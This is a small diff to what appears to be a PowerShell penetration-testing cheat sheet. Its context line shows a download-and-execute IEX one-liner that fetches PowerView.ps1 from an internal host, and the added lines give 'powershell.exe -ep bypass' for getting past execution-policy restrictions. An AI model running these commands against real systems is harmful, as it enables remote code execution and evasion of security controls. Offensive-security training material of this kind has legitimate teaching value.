@@ -28,6 +28,11 @@ IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5:8000/PowerView.ps
 
 > Note: many defenses detect `IEX` + download + script execution, so this is noisy in production environments.
 
+If you transmit the file to disk and receive a script restriction trying to execute it, use:
+```bash
+powershell.exe -ep bypass
+```
+
 ---
 
 ## Useful commands & examples 
